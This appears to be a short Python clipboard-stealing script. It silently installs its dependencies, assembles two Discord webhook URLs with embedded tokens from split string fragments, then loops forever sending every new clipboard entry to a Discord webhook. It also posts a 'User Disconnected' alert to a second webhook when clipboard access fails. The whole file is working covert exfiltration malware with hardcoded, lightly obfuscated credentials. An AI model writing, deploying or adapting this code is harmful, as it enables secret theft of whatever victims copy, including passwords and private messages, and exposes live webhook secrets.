import os
import time
import json

try:
	import requests
except:
	os.system("python -m pip install requests")
finally:
	import requests


try:
	import pyperclip
except:
	os.system("python -m pip install pyperclip")
finally:
	import pyperclip
	
hookURL=''
logURL=''
try:
	with open("webhook.json", "r") as f:
		whData = json.loads(f.read())
	hookURL = whData["esc"][0]
	logURL = whData["log"][0]
except FileNotFoundError:
	parts={'p1':'https://discord.com/api/',
			'p2':'webhooks/1251910159702294559/',
			'p3':'ba2roVYSNdIaWMle3mg4uNhTtMnVGRQGCdVY7B8OZUqVHwPX_bwtsPetJfwVWqaFCUwk'}
	for x in parts:
		logURL=logURL+parts[x]
	parts={'p1':'https://',
			'p2':'discord.com/api/webhooks/',
			'p3':'1251910244330635264/80NmyCxh7EJMTnBLHUC0JWrSF7HODFm3fFsWDJdmaiEKO6QikjClRYs4DwU_CjhLu-69'}
	for x in parts:
		hookURL=hookURL+parts[x]

while True:
	try:
		newCOPY = pyperclip.waitForNewPaste()
		print(newCOPY)
		if newCOPY.strip() != "":
			newCOPY = "```\n" + newCOPY + "\n```"
		else:
			newCOPY = ""
		usrhook = {"content": newCOPY,
			"username": "Kopier",
			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
			"tts": "false"}
		ping = requests.post(hookURL, json=usrhook)
	except pyperclip.PyperclipWindowsException:
		print("EOP: End of Program")
		try:
			test = pyperclip.paste()
		except:
			newCOPY = '`User Disconnected`'
			usrhook = {"content": newCOPY,
				"username": "Red Flag",
				"avatar_url": 'https://media.discordapp.net/attachments/871719349809971220/1223331266695266424/5TRKaAyjc.png?ex=66197706&is=66070206&hm=a06c48fb0ac8e0d1f34c67ba1609c72e374d91333d63db5f05cfc1452f82470e&=',
				"tts": "false"}
			ping = requests.post(logURL, json=usrhook)
			break